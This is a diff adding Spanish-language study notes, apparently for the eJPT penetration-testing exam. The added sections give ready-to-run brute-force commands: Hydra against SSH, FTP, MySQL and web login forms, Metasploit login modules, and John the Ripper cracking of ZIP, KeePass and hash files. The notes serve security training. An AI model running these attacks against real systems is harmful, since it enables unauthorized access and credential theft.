@@ -147,10 +147,172 @@ hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
 
 # 05. Uso de Hydra - Ataques de Fuerza Bruta a Usuarios (SSH y FTP)
 
+Cuando tienes la contraseña pero no el usuario — o no tienes ninguno de los dos — puedes usar listas para ambos campos.
+
+**Cuando sabes la contraseña pero no el usuario:**
+
+```bash
+# SSH
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ssh://<IP víctima>
+
+# FTP
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ftp://<IP víctima>
+```
+
+**Cuando no sabes ni usuario ni contraseña:**
+
+```bash
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt \
+      -P /usr/share/wordlists/rockyou.txt \
+      ssh://<IP víctima> -t 4
+```
+
+| Flag | Descripción                                  |
+| ---- | -------------------------------------------- |
+| `-L` | Lista de usuarios                            |
+| `-l` | Usuario específico                           |
+| `-P` | Lista de contraseñas                         |
+| `-p` | Contraseña específica                        |
+| `-t` | Hilos paralelos (default 16, bajar si falla) |
+
+> En el eJPT suele haber pistas sobre el usuario en la web de la máquina, en archivos expuestos o en el resultado del escaneo. Búscalos antes de hacer fuerza bruta ciega.
+
+---
+
 # 06. Uso de Hydra - Ataques de Fuerza Bruta a Paneles de Login Web
 
-# 07. Ataquers de Fuerza bruta con Metasploit
+Para atacar un formulario web necesitas saber exactamente qué parámetros envía — para eso usas **Burp Suite** como intermediario.
+
+### Paso 1 — Configurar el proxy en el navegador
+
+En tu navegador configura el proxy manual:
+
+- **HTTP Proxy:** `127.0.0.1`
+- **Puerto:** `8080`
+
+### Paso 2 — Interceptar la petición con Burp Suite
+
+1. Abre Burp Suite → pestaña **Proxy** → activa **Intercept is on**
+2. Intenta hacer login con cualquier credencial
+3. Burp captura la petición — anota el **endpoint**, los **parámetros** y el **mensaje de error**
+   Lo que necesitas identificar:
+
+```
+POST /my_weblog/admin.php
+username=admin&password=test123
+→ respuesta cuando falla: "Incorrect"
+```
+
+### Paso 3 — Lanzar Hydra contra el formulario
+
+```bash
+hydra -t 64 \
+      -l admin \
+      -P /usr/share/wordlists/rockyou.txt \
+      <IP víctima> \
+      http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect"
+```
+
+La estructura del último argumento es siempre:
+
+```
+"<ruta>:<parámetros con ^USER^ y/o ^PASS^>:<mensaje de error>"
+```
+
+| Parte                            | Descripción                                               |
+| -------------------------------- | --------------------------------------------------------- |
+| `/my_weblog/admin.php`           | Ruta del formulario                                       |
+| `username=admin&password=^PASS^` | Parámetros POST — `^PASS^` es donde Hydra inyecta         |
+| `Incorrect`                      | Texto que aparece cuando las credenciales son incorrectas |
+
+> El texto de error debe ser exactamente lo que devuelve el servidor al fallar — cópialo directo desde Burp o desde el HTML de la respuesta.
+
+**Si el login es GET en vez de POST:**
+
+```bash
+hydra -l admin -P rockyou.txt <IP> http-get-form "/login:user=^USER^&pass=^PASS^:Invalid"
+```
+
+# 07. Ataques de Fuerza bruta con Metasploit
+
+**FTP:**
+
+```bash
+search ftp_login
+use 0
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set USERNAME <usuario>
+set RHOSTS <IP víctima>
+run
+```
+
+**SSH:**
+
+```bash
+search ssh_login
+use 0
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set USERNAME <usuario>
+set RHOSTS <IP víctima>
+run
+```
+
+> Si no tienes el usuario: `set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt`
+
+---
 
 # 08. Ataques de Fuerza Bruta contra Base de Datos
 
+```bash
+# Con rockyou
+hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt mysql://<IP víctima>
+
+# Con diccionario sin espacios (MySQL los rechaza)
+hydra -l <usuario> -P diccionario_sin_espacios.txt mysql://<IP víctima>
+```
+
+Una vez tienes credenciales, conéctate y enumera:
+
+```bash
+mysql -h <IP víctima> -u <usuario> -p<contraseña>
+```
+
+```sql
+show databases;       -- lista bases de datos
+use <database>;       -- selecciona una
+show tables;          -- lista tablas
+SELECT * FROM users;  -- vuelca la tabla (busca hashes o contraseñas)
+```
+
+---
+
 # 09. Ataques de Fuerza Bruta en Local con John The Ripper
+
+Úsalo cuando tienes un archivo protegido o un hash en tu máquina.
+
+**ZIP protegido:**
+
+```bash
+zip2john archivo.zip > hash                                   # extrae el hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash         # crackea
+john --show hash                                              # muestra la contraseña
+```
+
+**Base de datos KeePass (.kdbx):**
+
+```bash
+keepass2john Database.kdbx > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+john --show hash
+```
+
+**Hash suelto (MD5, SHA1...):**
+
+```bash
+hash-identifier          # identifica el tipo de hash (pega el hash y te dice cuál es)
+
+john --format=RAW-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash
+john --format=RAW-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+
+> Alternativa online para identificar hashes: [hashes.com](https://hashes.com/en/tools/hash_identifier)
